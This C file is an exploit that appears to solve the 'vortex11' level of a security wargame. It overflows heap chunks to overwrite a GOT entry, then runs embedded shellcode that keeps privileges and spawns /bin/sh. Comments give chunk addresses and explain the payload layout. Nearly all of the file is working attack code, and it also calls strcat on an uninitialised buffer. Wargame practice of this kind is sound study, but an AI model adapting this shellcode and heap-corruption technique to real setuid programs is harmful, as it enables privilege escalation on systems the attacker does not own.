#include <unistd.h>
#include <stdio.h>
#include <string.h>

/*
  p: 0x0804e000, 0x800
  q: 0x0804f030, 0x10
  r: 0x0804e800, 0x800
  s: 0x0804f040, 0x10

  The 0x800 mallocs are equal to 0x1000 / 2, so they are allocated with malloc_bytes()
*/

int main(){
  char *filename = "/vortex/vortex11";
  char arg1[0x1000];
  char arg2[0x10];

  int arg1len = 0x809;
  char *shellcode = "\x90\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"; // shellcode has a nop at the start of it otherwise it starts at an address with a null byte in it and we can't overwrite the GOT with a strcpy.
  char nops[0x1000];
  char *targetaddr = "\xe8\xbf\x04\x08"; // malloc adds 0x40 to the address, this is address 0x0804c028 (our target), minus 0x40

  int i;
  for(i = 0; i < arg1len - (strlen(shellcode) + strlen(targetaddr) + 1); i++) {
    nops[i] = '\x90';
  }
  nops[i] = '\x0';
  
  strcat(arg1, shellcode);
  strcat(arg1, nops);
  strcat(arg1, targetaddr);  

  strcat(arg2, "\x01\xe8\x04\x08"); // r + 1
  
  char *argv[] = {filename, arg1, arg2, NULL};\
  execv(filename, argv);
  
  return 0;
}
